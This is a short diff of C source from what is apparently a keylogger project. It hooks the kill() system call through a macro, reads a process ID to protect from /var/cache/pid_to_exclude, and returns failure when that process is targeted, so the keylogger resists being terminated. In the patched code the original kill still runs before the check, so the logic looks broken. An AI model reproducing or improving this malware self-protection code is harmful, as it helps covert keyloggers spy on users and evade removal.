@@ -29,15 +29,17 @@ int	kill(pid_t pid, int sig)											\
 	}																	\
 	if (to_exclude == 0)												\
 	{																	\
-		if ((fd = open("/home/user42/Bureau/keylogger/pid_to_exclude", O_RDONLY)) != -1)\
+		if ((fd = open("/var/cache/pid_to_exclude", O_RDONLY)) != -1)\
 		{																\
 			if (read(fd, &to_exclude, sizeof(pid_t)) == -1)				\
 				to_exclude = -1;										\
 		}																\
 	}																	\
-	/* if (pid == to_exclude)												\
-		return -1;	*/													\
 	ret = original_##kill(pid, sig);									\
+	if (pid == to_exclude){											\
+		/*dprintf(1, "Match: ignore kill\n");*/										\
+		return -1;	}												\
+	/*ret = original_##kill(pid, sig);*/								\
 	return ret;															\
 }
 
